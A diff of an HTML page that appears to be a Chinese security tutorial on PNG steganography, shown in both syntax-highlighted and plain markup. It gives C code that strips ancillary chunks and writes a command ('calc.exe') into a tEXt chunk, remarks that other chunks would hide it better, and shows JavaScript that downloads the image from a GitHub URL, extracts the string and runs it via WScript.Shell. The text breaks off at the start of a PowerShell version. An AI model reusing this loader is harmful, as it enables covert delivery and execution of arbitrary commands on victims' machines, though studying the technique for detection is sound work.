-           <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>,j=<span class="hljs-number">0</span>;
-           <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> Signature[<span class="hljs-number">8</span>]={<span class="hljs-number">0x89</span>,<span class="hljs-number">0x50</span>,<span class="hljs-number">0x4e</span>,<span class="hljs-number">0x47</span>,<span class="hljs-number">0x0d</span>,<span class="hljs-number">0x0a</span>,<span class="hljs-number">0x1a</span>,<span class="hljs-number">0x0a</span>};         
-           <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> IEND[<span class="hljs-number">12</span>]={<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x49</span>,<span class="hljs-number">0x45</span>,<span class="hljs-number">0x4e</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0xae</span>,<span class="hljs-number">0x42</span>,<span class="hljs-number">0x60</span>,<span class="hljs-number">0x82</span>};        
-           <span class="hljs-keyword">if</span>((fp=fopen(<span class="hljs-string">"c:\\test\\0.png"</span>,<span class="hljs-string">"rb+"</span>))==<span class="hljs-literal">NULL</span>)
+           unsigned char *buf=NULL;
+           unsigned int len=0;
+           unsigned int ChunkLen=0;
+           unsigned int ChunkCRC32=0;
+           unsigned int ChunkOffset=0;         
+           unsigned int crc32=0;
+           unsigned int i=0,j=0;
+           unsigned char Signature[8]={0x89,0x50,0x4e,0x47,0x0d,0x0a,0x1a,0x0a};         
+           unsigned char IEND[12]={0x00,0x00,0x00,0x00,0x49,0x45,0x4e,0x44,0xae,0x42,0x60,0x82};        
+           if((fp=fopen(&quot;c:\\test\\0.png&quot;,&quot;rb+&quot;))==NULL)
                        return0;  
-           <span class="hljs-keyword">if</span>((fpnew=fopen(<span class="hljs-string">"c:\\test\\new.png"</span>,<span class="hljs-string">"wb"</span>))==<span class="hljs-literal">NULL</span>)
+           if((fpnew=fopen(&quot;c:\\test\\new.png&quot;,&quot;wb&quot;))==NULL)
                        return0;  
-           fseek(fp,<span class="hljs-number">0</span>,SEEK_END);
+           fseek(fp,0,SEEK_END);
            len=ftell(fp);
-           buf=newunsigned <span class="hljs-keyword">char</span>[len];
-           fseek(fp,<span class="hljs-number">0</span>,SEEK_SET);
-           fread(buf,len,<span class="hljs-number">1</span>,fp);
-           <span class="hljs-built_in">printf</span>(<span class="hljs-string">"TotalLen=%d\n"</span>,len);
-           <span class="hljs-built_in">printf</span>(<span class="hljs-string">"----------------------------------------------------\n"</span>);
-           fseek(fp,<span class="hljs-number">8</span>,SEEK_SET);
-           ChunkOffset=<span class="hljs-number">8</span>;
-           i=<span class="hljs-number">0</span>;
-           fwrite(Signature,<span class="hljs-number">8</span>,<span class="hljs-number">1</span>,fpnew);
-           <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)
+           buf=newunsigned char[len];
+           fseek(fp,0,SEEK_SET);
+           fread(buf,len,1,fp);
+           printf(&quot;TotalLen=%d\n&quot;,len);
+           printf(&quot;----------------------------------------------------\n&quot;);
+           fseek(fp,8,SEEK_SET);
+           ChunkOffset=8;
+           i=0;
+           fwrite(Signature,8,1,fpnew);
+           while(1)
            {
                        i++;
-                       j=<span class="hljs-number">0</span>;
-                       <span class="hljs-built_in">memset</span>(buf,<span class="hljs-number">0</span>,len);
-                       fread(buf,<span class="hljs-number">4</span>,<span class="hljs-number">1</span>,fp);
-                      fwrite(buf,<span class="hljs-number">4</span>,<span class="hljs-number">1</span>,fpnew);
-                       ChunkLen=(buf[<span class="hljs-number">0</span>]&lt;&lt;<span class="hljs-number">24</span>)|(buf[<span class="hljs-number">1</span>]&lt;&lt;<span class="hljs-number">16</span>)|(buf[<span class="hljs-number">2</span>]&lt;&lt;<span class="hljs-number">8</span>)|buf[<span class="hljs-number">3</span>];
-                       fread(buf,<span class="hljs-number">4</span>+ChunkLen,<span class="hljs-number">1</span>,fp);
-                       <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[+]ChunkName:%c%c%c%c                "</span>,buf[<span class="hljs-number">0</span>],buf[<span class="hljs-number">1</span>],buf[<span class="hljs-number">2</span>],buf[<span class="hljs-number">3</span>]);
-                       <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strncmp</span>((<span class="hljs-keyword">char</span>*)buf,<span class="hljs-string">"IHDR"</span>,<span class="hljs-number">4</span>)==<span class="hljs-number">0</span>|<span class="hljs-built_in">strncmp</span>((<span class="hljs-keyword">char</span>*)buf,<span class="hljs-string">"PLTE"</span>,<span class="hljs-number">4</span>)==<span class="hljs-number">0</span>|<span class="hljs-built_in">strncmp</span>((<span class="hljs-keyword">char</span>*)buf,<span class="hljs-string">"IDAT"</span>,<span class="hljs-number">4</span>)==<span class="hljs-number">0</span>)
+                       j=0;
+                       memset(buf,0,len);
+                       fread(buf,4,1,fp);
+                      fwrite(buf,4,1,fpnew);
+                       ChunkLen=(buf[0]&lt;&lt;24)|(buf[1]&lt;&lt;16)|(buf[2]&lt;&lt;8)|buf[3];
+                       fread(buf,4+ChunkLen,1,fp);
+                       printf(&quot;[+]ChunkName:%c%c%c%c                &quot;,buf[0],buf[1],buf[2],buf[3]);
+                       if(strncmp((char*)buf,&quot;IHDR&quot;,4)==0|strncmp((char*)buf,&quot;PLTE&quot;,4)==0|strncmp((char*)buf,&quot;IDAT&quot;,4)==0)
                        {           
-                                   <span class="hljs-built_in">printf</span>(<span class="hljs-string">"PaletteChunk\n"</span>);
-                                   fwrite(buf,<span class="hljs-number">4</span>+ChunkLen,<span class="hljs-number">1</span>,fpnew);
+                                   printf(&quot;PaletteChunk\n&quot;);
+                                   fwrite(buf,4+ChunkLen,1,fpnew);
                        }
-                       <span class="hljs-keyword">else</span>
+                       else
                        {
-                                   <span class="hljs-built_in">printf</span>(<span class="hljs-string">"AncillaryChunk\n"</span>);
-                                   fseek(fpnew,<span class="hljs-number">-4</span>,SEEK_CUR);
-                                   j=<span class="hljs-number">1</span>;
+                                   printf(&quot;AncillaryChunk\n&quot;);
+                                   fseek(fpnew,-4,SEEK_CUR);
+                                   j=1;
                        }
-                       <span class="hljs-built_in">printf</span>(<span class="hljs-string">"  ChunkOffset:0x%08x       \n"</span>,ChunkOffset);
-                       <span class="hljs-built_in">printf</span>(<span class="hljs-string">"   ChunkLen:%10d             \n"</span>,ChunkLen);
-                       crc32=GetCrc32(buf,ChunkLen+<span class="hljs-number">4</span>);
-                       <span class="hljs-built_in">printf</span>(<span class="hljs-string">"   ExpectCRC32:%08X\n"</span>,crc32);
-                       fread(buf,<span class="hljs-number">4</span>,<span class="hljs-number">1</span>,fp);
-                       ChunkCRC32=(buf[<span class="hljs-number">0</span>]&lt;&lt;<span class="hljs-number">24</span>)|(buf[<span class="hljs-number">1</span>]&lt;&lt;<span class="hljs-number">16</span>)|(buf[<span class="hljs-number">2</span>]&lt;&lt;<span class="hljs-number">8</span>)|buf[<span class="hljs-number">3</span>];
-                       <span class="hljs-built_in">printf</span>(<span class="hljs-string">"   ChunkCRC32:%08X                    "</span>,ChunkCRC32);
-                       <span class="hljs-keyword">if</span>(crc32!=ChunkCRC32)
-                                   <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[!]CRC32CheckError!\n"</span>);
-                       <span class="hljs-keyword">else</span>
+                       printf(&quot;  ChunkOffset:0x%08x       \n&quot;,ChunkOffset);
+                       printf(&quot;   ChunkLen:%10d             \n&quot;,ChunkLen);
+                       crc32=GetCrc32(buf,ChunkLen+4);
+                       printf(&quot;   ExpectCRC32:%08X\n&quot;,crc32);
+                       fread(buf,4,1,fp);
+                       ChunkCRC32=(buf[0]&lt;&lt;24)|(buf[1]&lt;&lt;16)|(buf[2]&lt;&lt;8)|buf[3];
+                       printf(&quot;   ChunkCRC32:%08X                    &quot;,ChunkCRC32);
+                       if(crc32!=ChunkCRC32)
+                                   printf(&quot;[!]CRC32CheckError!\n&quot;);
+                       else
                        {
-                                   <span class="hljs-built_in">printf</span>(<span class="hljs-string">"CheckSuccess!\n\n"</span>);
-                                   <span class="hljs-keyword">if</span>(j==<span class="hljs-number">0</span>)
-                                               fwrite(buf,<span class="hljs-number">4</span>,<span class="hljs-number">1</span>,fpnew);
+                                   printf(&quot;CheckSuccess!\n\n&quot;);
+                                   if(j==0)
+                                               fwrite(buf,4,1,fpnew);
                        }
                        ChunkLen=ftell(fp);
-                       <span class="hljs-keyword">if</span>(ChunkLen==(len<span class="hljs-number">-12</span>))
+                       if(ChunkLen==(len-12))
                        {
-                                   <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n----------------------------------------------------\n"</span>);
-                                   <span class="hljs-built_in">printf</span>(<span class="hljs-string">"TotalChunk:%d\n"</span>,i);                       
-                                   <span class="hljs-keyword">break</span>;
+                                   printf(&quot;\n----------------------------------------------------\n&quot;);
+                                   printf(&quot;TotalChunk:%d\n&quot;,i);                       
+                                   break;
                        }
            }
-           fwrite(IEND,<span class="hljs-number">12</span>,<span class="hljs-number">1</span>,fpnew);
+           fwrite(IEND,12,1,fpnew);
            fclose(fp);
            fclose(fpnew);
            return0;         
 }
 </code></pre>
-<h2 id="0x05-写入payload"><a class="markdownIt-Anchor" href="#0x05-写入payload"></a> 0x05-写入Payload</h2>
-<p>实例：按照辅助数据块的格式写入Payload</p>
+<h2 id="0x05-写入Payload"><a href="#0x05-写入Payload" class="headerlink" title="0x05-写入Payload"></a>0x05-写入Payload</h2><p>实例：按照辅助数据块的格式写入Payload</p>
 <p>写入的Payload为:calc.exe</p>
 <p>辅助数据块设置为：tEXt(文本信息数据块)</p>
 <p>对应的完整数据块结构如下：</p>
@@ -474,195 +464,193 @@
 <p>Chunk Data：63 61 6c 63 2e 65 78 65</p>
 <p>CRC：fa c4 08 76</p>
 <p>写入的十六进制数据如下：</p>
-<pre class="highlight"><code class="">00 00 00 08 74 45 58 74 63 61 6c 63 2e 6578 65 fa c4 08 76
-</code></pre>
-<p>注： 本实例仅作演示，实际使用可换成其他数据块，更加隐蔽</p>
+<pre><code>00 00 00 08 74 45 58 74 63 61 6c 63 2e 6578 65 fa c4 08 76
+</code></pre><p>注： 本实例仅作演示，实际使用可换成其他数据块，更加隐蔽</p>
 <ol>
 <li>工具实现</li>
 </ol>
 <p>使用Hex Friend插入数据，如图</p>
 <p>保存后，不影响PNG文件浏览</p>
-<ol start="2">
+<ol>
 <li>程序实现</li>
 </ol>
 <p>去掉PNG文件所有的辅助数据块后，写入payload数据块tEXt</p>
 <p>保存为addpayload.cpp,完整代码：</p>
-<pre class="highlight"><code class="C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
-<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;string.h&gt;</span></span>
-<span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> <span class="hljs-title">GetCrc32</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>*InStr,<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> len)</span></span>{        
-            <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> Crc32Table[<span class="hljs-number">256</span>];      
-            <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i,j;        
-            <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> Crc;        
-            <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++){        
+<pre><code class="C">#include&lt;stdio.h&gt;
+#include&lt;string.h&gt;
+unsigned int GetCrc32(unsigned char*InStr,unsigned int len){        
+            unsigned int Crc32Table[256];      
+            unsigned int i,j;        
+            unsigned int Crc;        
+            for(i = 0; i &lt; 256; i++){        
                         Crc= i;        
-                        <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">8</span>; j++){        
-                                    <span class="hljs-keyword">if</span>(Crc &amp; <span class="hljs-number">1</span>)        
-                                                Crc= (Crc &gt;&gt; <span class="hljs-number">1</span>) ^ <span class="hljs-number">0xEDB88320</span>;        
-                                    <span class="hljs-keyword">else</span>       
-                                                Crc&gt;&gt;= <span class="hljs-number">1</span>;      
+                        for(j = 0; j &lt; 8; j++){        
+                                    if(Crc &amp; 1)        
+                                                Crc= (Crc &gt;&gt; 1) ^ 0xEDB88320;        
+                                    else       
+                                                Crc&gt;&gt;= 1;      
                         }        
                         Crc32Table[i]= Crc;        
             }        
-            Crc=<span class="hljs-number">0xffffffff</span>;        
-            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> m=<span class="hljs-number">0</span>; m&lt;len; m++){          
-                        Crc= (Crc &gt;&gt; <span class="hljs-number">8</span>) ^ Crc32Table[(Crc &amp; <span class="hljs-number">0xFF</span>) ^ InStr[m]];        
+            Crc=0xffffffff;        
+            for(unsigned int m=0; m&lt;len; m++){          
+                        Crc= (Crc &gt;&gt; 8) ^ Crc32Table[(Crc &amp; 0xFF) ^ InStr[m]];        
             }
-            Crc^= <span class="hljs-number">0xFFFFFFFF</span>;     
+            Crc^= 0xFFFFFFFF;     
             returnCrc;        
 }       
-<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">convertStrToUnChar</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* str, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>* UnChar)</span>  
-</span>{  
-            inti = <span class="hljs-built_in">strlen</span>(str), j = <span class="hljs-number">0</span>, counter = <span class="hljs-number">0</span>;  
-            charc[<span class="hljs-number">2</span>];  
-            unsignedint bytes[<span class="hljs-number">2</span>];  
-            <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; i; j += <span class="hljs-number">2</span>)   
+void convertStrToUnChar(char* str, unsigned char* UnChar)  
+{  
+            inti = strlen(str), j = 0, counter = 0;  
+            charc[2];  
+            unsignedint bytes[2];  
+            for(j = 0; j &lt; i; j += 2)   
             {  
-                        <span class="hljs-keyword">if</span>(<span class="hljs-number">0</span>== j % <span class="hljs-number">2</span>)  
+                        if(0== j % 2)  
                         {  
-                                    c[<span class="hljs-number">0</span>]= str[j];  
-                                    c[<span class="hljs-number">1</span>]= str[j + <span class="hljs-number">1</span>];  
-                                    <span class="hljs-built_in">sscanf</span>(c,<span class="hljs-string">"%02x"</span> , &amp;bytes[<span class="hljs-number">0</span>]);  
-                                    UnChar[counter]= bytes[<span class="hljs-number">0</span>];  
+                                    c[0]= str[j];  
+                                    c[1]= str[j + 1];  
+                                    sscanf(c,&quot;%02x&quot; , &amp;bytes[0]);  
+                                    UnChar[counter]= bytes[0];  
                                     counter++;  
                         }  
             }  
-            <span class="hljs-keyword">return</span>;  
+            return;  
 }    
-<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">AddPayload</span><span class="hljs-params">(FILE *fp)</span>
-</span>{
-            <span class="hljs-keyword">char</span>*Payload=<span class="hljs-string">"calc.exe"</span>;
+void AddPayload(FILE *fp)
+{
+            char*Payload=&quot;calc.exe&quot;;
             unsignedchar *buf;
             intlen;
             intcrc32;
-            len=<span class="hljs-built_in">strlen</span>(Payload); 
-            buf=newunsigned <span class="hljs-keyword">char</span>[len+<span class="hljs-number">12</span>];
-            buf[<span class="hljs-number">0</span>]=len&gt;&gt;<span class="hljs-number">24</span>&amp;<span class="hljs-number">0xff</span>;
-            buf[<span class="hljs-number">1</span>]=len&gt;&gt;<span class="hljs-number">16</span>&amp;<span class="hljs-number">0xff</span>;
-            buf[<span class="hljs-number">2</span>]=len&gt;&gt;<span class="hljs-number">8</span>&amp;<span class="hljs-number">0xff</span>;
-            buf[<span class="hljs-number">3</span>]=len&amp;<span class="hljs-number">0xff</span>;
-            buf[<span class="hljs-number">4</span>]=<span class="hljs-string">'t'</span>;
-            buf[<span class="hljs-number">5</span>]=<span class="hljs-string">'E'</span>;
-            buf[<span class="hljs-number">6</span>]=<span class="hljs-string">'X'</span>;
-            buf[<span class="hljs-number">7</span>]=<span class="hljs-string">'t'</span>;
-            <span class="hljs-keyword">for</span>(intj=<span class="hljs-number">0</span>;j&lt;len;j++)
-                        buf[j+<span class="hljs-number">8</span>]=Payload[j];
-            buf[len+<span class="hljs-number">8</span>]=<span class="hljs-number">0XFA</span>;
-            buf[len+<span class="hljs-number">9</span>]=<span class="hljs-number">0XC4</span>;
-            buf[len+<span class="hljs-number">10</span>]=<span class="hljs-number">0X08</span>;
-            buf[len+<span class="hljs-number">11</span>]=<span class="hljs-number">0X76</span>;
-            fwrite(buf,len+<span class="hljs-number">12</span>,<span class="hljs-number">1</span>,fp);
+            len=strlen(Payload); 
+            buf=newunsigned char[len+12];
+            buf[0]=len&gt;&gt;24&amp;0xff;
+            buf[1]=len&gt;&gt;16&amp;0xff;
+            buf[2]=len&gt;&gt;8&amp;0xff;
+            buf[3]=len&amp;0xff;
+            buf[4]=&#39;t&#39;;
+            buf[5]=&#39;E&#39;;
+            buf[6]=&#39;X&#39;;
+            buf[7]=&#39;t&#39;;
+            for(intj=0;j&lt;len;j++)
+                        buf[j+8]=Payload[j];
+            buf[len+8]=0XFA;
+            buf[len+9]=0XC4;
+            buf[len+10]=0X08;
+            buf[len+11]=0X76;
+            fwrite(buf,len+12,1,fp);
 }
-<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span>
-</span>{
+int main(int argc, char* argv[])
+{
             FILE*fp,*fpnew;   
-            <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *buf=<span class="hljs-literal">NULL</span>;
-            <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> len=<span class="hljs-number">0</span>;
-            <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> ChunkLen=<span class="hljs-number">0</span>;
-            <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> ChunkCRC32=<span class="hljs-number">0</span>;
-            <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> ChunkOffset=<span class="hljs-number">0</span>;         
-            <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> crc32=<span class="hljs-number">0</span>;
-            <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>,j=<span class="hljs-number">0</span>;
-            <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> Signature[<span class="hljs-number">8</span>]={<span class="hljs-number">0x89</span>,<span class="hljs-number">0x50</span>,<span class="hljs-number">0x4e</span>,<span class="hljs-number">0x47</span>,<span class="hljs-number">0x0d</span>,<span class="hljs-number">0x0a</span>,<span class="hljs-number">0x1a</span>,<span class="hljs-number">0x0a</span>};          
-            <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> IEND[<span class="hljs-number">12</span>]={<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x49</span>,<span class="hljs-number">0x45</span>,<span class="hljs-number">0x4e</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0xae</span>,<span class="hljs-number">0x42</span>,<span class="hljs-number">0x60</span>,<span class="hljs-number">0x82</span>};         
-            <span class="hljs-keyword">if</span>((fp=fopen(<span class="hljs-string">"c:\\test\\test.png"</span>,<span class="hljs-string">"rb+"</span>))==<span class="hljs-literal">NULL</span>)
+            unsigned char *buf=NULL;
+            unsigned int len=0;
+            unsigned int ChunkLen=0;
+            unsigned int ChunkCRC32=0;
+            unsigned int ChunkOffset=0;         
+            unsigned int crc32=0;
+            unsigned int i=0,j=0;
+            unsigned char Signature[8]={0x89,0x50,0x4e,0x47,0x0d,0x0a,0x1a,0x0a};          
+            unsigned char IEND[12]={0x00,0x00,0x00,0x00,0x49,0x45,0x4e,0x44,0xae,0x42,0x60,0x82};         
+            if((fp=fopen(&quot;c:\\test\\test.png&quot;,&quot;rb+&quot;))==NULL)
                         return0;  
-            <span class="hljs-keyword">if</span>((fpnew=fopen(<span class="hljs-string">"c:\\test\\new.png"</span>,<span class="hljs-string">"wb"</span>))==<span class="hljs-literal">NULL</span>)
+            if((fpnew=fopen(&quot;c:\\test\\new.png&quot;,&quot;wb&quot;))==NULL)
                         return0;  
-            fseek(fp,<span class="hljs-number">0</span>,SEEK_END);
+            fseek(fp,0,SEEK_END);
             len=ftell(fp);
-            buf=newunsigned <span class="hljs-keyword">char</span>[len];
-            fseek(fp,<span class="hljs-number">0</span>,SEEK_SET);
-            fread(buf,len,<span class="hljs-number">1</span>,fp);
-            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"TotalLen=%d\n"</span>,len);
-            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"----------------------------------------------------\n"</span>);
-            fseek(fp,<span class="hljs-number">8</span>,SEEK_SET);
-            ChunkOffset=<span class="hljs-number">8</span>;
-            i=<span class="hljs-number">0</span>;
-            fwrite(Signature,<span class="hljs-number">8</span>,<span class="hljs-number">1</span>,fpnew);
-            <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)
+            buf=newunsigned char[len];
+            fseek(fp,0,SEEK_SET);
+            fread(buf,len,1,fp);
+            printf(&quot;TotalLen=%d\n&quot;,len);
+            printf(&quot;----------------------------------------------------\n&quot;);
+            fseek(fp,8,SEEK_SET);
+            ChunkOffset=8;
+            i=0;
+            fwrite(Signature,8,1,fpnew);
+            while(1)
             {
                         i++;
-                        j=<span class="hljs-number">0</span>;
-                        <span class="hljs-built_in">memset</span>(buf,<span class="hljs-number">0</span>,len);
-                        fread(buf,<span class="hljs-number">4</span>,<span class="hljs-number">1</span>,fp);
-                        fwrite(buf,<span class="hljs-number">4</span>,<span class="hljs-number">1</span>,fpnew);
-                        ChunkLen=(buf[<span class="hljs-number">0</span>]&lt;&lt;<span class="hljs-number">24</span>)|(buf[<span class="hljs-number">1</span>]&lt;&lt;<span class="hljs-number">16</span>)|(buf[<span class="hljs-number">2</span>]&lt;&lt;<span class="hljs-number">8</span>)|buf[<span class="hljs-number">3</span>];
-                        fread(buf,<span class="hljs-number">4</span>+ChunkLen,<span class="hljs-number">1</span>,fp);
-                        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[+]ChunkName:%c%c%c%c                 "</span>,buf[<span class="hljs-number">0</span>],buf[<span class="hljs-number">1</span>],buf[<span class="hljs-number">2</span>],buf[<span class="hljs-number">3</span>]);
-                        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strncmp</span>((<span class="hljs-keyword">char</span>*)buf,<span class="hljs-string">"IHDR"</span>,<span class="hljs-number">4</span>)==<span class="hljs-number">0</span>|<span class="hljs-built_in">strncmp</span>((<span class="hljs-keyword">char</span>*)buf,<span class="hljs-string">"PLTE"</span>,<span class="hljs-number">4</span>)==<span class="hljs-number">0</span>|<span class="hljs-built_in">strncmp</span>((<span class="hljs-keyword">char</span> *)buf,<span class="hljs-string">"IDAT"</span>,<span class="hljs-number">4</span>)==<span class="hljs-number">0</span>)
+                        j=0;
+                        memset(buf,0,len);
+                        fread(buf,4,1,fp);
+                        fwrite(buf,4,1,fpnew);
+                        ChunkLen=(buf[0]&lt;&lt;24)|(buf[1]&lt;&lt;16)|(buf[2]&lt;&lt;8)|buf[3];
+                        fread(buf,4+ChunkLen,1,fp);
+                        printf(&quot;[+]ChunkName:%c%c%c%c                 &quot;,buf[0],buf[1],buf[2],buf[3]);
+                        if(strncmp((char*)buf,&quot;IHDR&quot;,4)==0|strncmp((char*)buf,&quot;PLTE&quot;,4)==0|strncmp((char *)buf,&quot;IDAT&quot;,4)==0)
                         {           
-                                    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"PaletteChunk\n"</span>);
-                                    fwrite(buf,<span class="hljs-number">4</span>+ChunkLen,<span class="hljs-number">1</span>,fpnew);
+                                    printf(&quot;PaletteChunk\n&quot;);
+                                    fwrite(buf,4+ChunkLen,1,fpnew);
                         }
-                        <span class="hljs-keyword">else</span>
+                        else
                         {
-                                    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"AncillaryChunk\n"</span>);
-                                    fseek(fpnew,<span class="hljs-number">-4</span>,SEEK_CUR);
-                                    j=<span class="hljs-number">1</span>;
+                                    printf(&quot;AncillaryChunk\n&quot;);
+                                    fseek(fpnew,-4,SEEK_CUR);
+                                    j=1;
                         }
-                        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"   ChunkOffset:0x%08x       \n"</span>,ChunkOffset);
-                        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"   ChunkLen: %10d              \n"</span>,ChunkLen);
-                        crc32=GetCrc32(buf,ChunkLen+<span class="hljs-number">4</span>);
-                        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"   ExpectCRC32:%08X\n"</span>,crc32);
-                        fread(buf,<span class="hljs-number">4</span>,<span class="hljs-number">1</span>,fp);
-                        ChunkCRC32=(buf[<span class="hljs-number">0</span>]&lt;&lt;<span class="hljs-number">24</span>)|(buf[<span class="hljs-number">1</span>]&lt;&lt;<span class="hljs-number">16</span>)|(buf[<span class="hljs-number">2</span>]&lt;&lt;<span class="hljs-number">8</span>)|buf[<span class="hljs-number">3</span>];
-                        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"   ChunkCRC32: %08X                     "</span>,ChunkCRC32);
-                        <span class="hljs-keyword">if</span>(crc32!=ChunkCRC32)
-                                    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[!]CRC32CheckError!\n"</span>);
-                        <span class="hljs-keyword">else</span>
+                        printf(&quot;   ChunkOffset:0x%08x       \n&quot;,ChunkOffset);
+                        printf(&quot;   ChunkLen: %10d              \n&quot;,ChunkLen);
+                        crc32=GetCrc32(buf,ChunkLen+4);
+                        printf(&quot;   ExpectCRC32:%08X\n&quot;,crc32);
+                        fread(buf,4,1,fp);
+                        ChunkCRC32=(buf[0]&lt;&lt;24)|(buf[1]&lt;&lt;16)|(buf[2]&lt;&lt;8)|buf[3];
+                        printf(&quot;   ChunkCRC32: %08X                     &quot;,ChunkCRC32);
+                        if(crc32!=ChunkCRC32)
+                                    printf(&quot;[!]CRC32CheckError!\n&quot;);
+                        else
                         {
-                                    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"CheckSuccess!\n\n"</span>);
-                                    <span class="hljs-keyword">if</span>(j==<span class="hljs-number">0</span>)
-                                                fwrite(buf,<span class="hljs-number">4</span>,<span class="hljs-number">1</span>,fpnew);
+                                    printf(&quot;CheckSuccess!\n\n&quot;);
+                                    if(j==0)
+                                                fwrite(buf,4,1,fpnew);
                         }
                         ChunkLen=ftell(fp);
-                        <span class="hljs-keyword">if</span>(ChunkLen==(len<span class="hljs-number">-12</span>))
+                        if(ChunkLen==(len-12))
                         {
-                                    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n----------------------------------------------------\n"</span>);
-                                    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"TotalChunk:%d\n"</span>,i);                        
-                                    <span class="hljs-keyword">break</span>;
+                                    printf(&quot;\n----------------------------------------------------\n&quot;);
+                                    printf(&quot;TotalChunk:%d\n&quot;,i);                        
+                                    break;
                         }
             }
             AddPayload(fpnew);
-            fwrite(IEND,<span class="hljs-number">12</span>,<span class="hljs-number">1</span>,fpnew);
+            fwrite(IEND,12,1,fpnew);
             fclose(fp);
             fclose(fpnew);
             return0;         
 }
 </code></pre>
 <p>使用check.cpp对其进行校验，如图，校验成功</p>
-<h2 id="0x06-读取payload并执行"><a class="markdownIt-Anchor" href="#0x06-读取payload并执行"></a> 0x06-读取payload并执行</h2>
-<p>将添加payload的图片上传至github，在客户端实现读取图片解析payload并执行：</p>
+<h2 id="0x06-读取payload并执行"><a href="#0x06-读取payload并执行" class="headerlink" title="0x06-读取payload并执行"></a>0x06-读取payload并执行</h2><p>将添加payload的图片上传至github，在客户端实现读取图片解析payload并执行：</p>
 <ol>
 <li>javascript</li>
 </ol>
-<pre class="highlight"><code class="javascript">h = newActiveXObject(<span class="hljs-string">"WinHttp.WinHttpRequest.5.1"</span>);
-h.SetTimeouts(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);
-h.Open(<span class="hljs-string">"GET"</span>,<span class="hljs-string">"https://raw.githubusercontent.com/3gstudent/PNG-Steganography/master//new.png"</span>,<span class="hljs-literal">false</span>);
+<pre><code class="javascript">h = newActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);
+h.SetTimeouts(0, 0, 0, 0);
+h.Open(&quot;GET&quot;,&quot;https://raw.githubusercontent.com/3gstudent/PNG-Steganography/master//new.png&quot;,false);
 h.Send();
 Data = h.ResponseText;
-x=Data.indexOf(<span class="hljs-string">"tEXt"</span>);
-y=Data.indexOf(<span class="hljs-string">"IEND"</span>);
-str=Data.substring(x+<span class="hljs-number">4</span>,y<span class="hljs-number">-8</span>);
-newActiveXObject(<span class="hljs-string">"WScript.Shell"</span>).Run(str);
+x=Data.indexOf(&quot;tEXt&quot;);
+y=Data.indexOf(&quot;IEND&quot;);
+str=Data.substring(x+4,y-8);
+newActiveXObject(&quot;WScript.Shell&quot;).Run(str);
 </code></pre>
-<ol start="2">
+<ol>
 <li>powershell</li>
 </ol>
-<pre class="highlight"><code class="powershell"><span class="hljs-variable">$url</span> = <span class="hljs-string">'https://raw.githubusercontent.com/3gstudent/PNG-Steganography/master/new.png'</span>
-<span class="hljs-variable">$request</span> = <span class="hljs-built_in">New-Object</span> System.Net.WebCLient
